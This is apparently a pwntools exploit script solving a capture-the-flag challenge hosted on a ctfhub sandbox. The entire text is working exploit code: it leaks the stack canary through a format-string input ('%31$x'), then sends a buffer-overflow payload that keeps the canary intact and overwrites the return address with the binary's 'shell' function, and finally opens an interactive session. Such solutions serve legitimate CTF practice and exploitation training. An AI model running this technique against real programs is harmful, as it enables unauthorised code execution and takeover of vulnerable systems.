from pwn import *

io = remote('challenge-00924c33bef2cbdc.sandbox.ctfhub.com', 34949)
io.recvline()
io.sendline(b'%31$x')
canary = int(io.recv(8), 16)
log.success('canary => %#x', canary)
elf = ELF('./pwn')
shell_addr = elf.symbols['shell']  # 0x80485a6
payload = cyclic(0x70-0xc) + p32(canary) + cyclic(0xc) + p32(shell_addr)
io.sendline(payload)
io.interactive()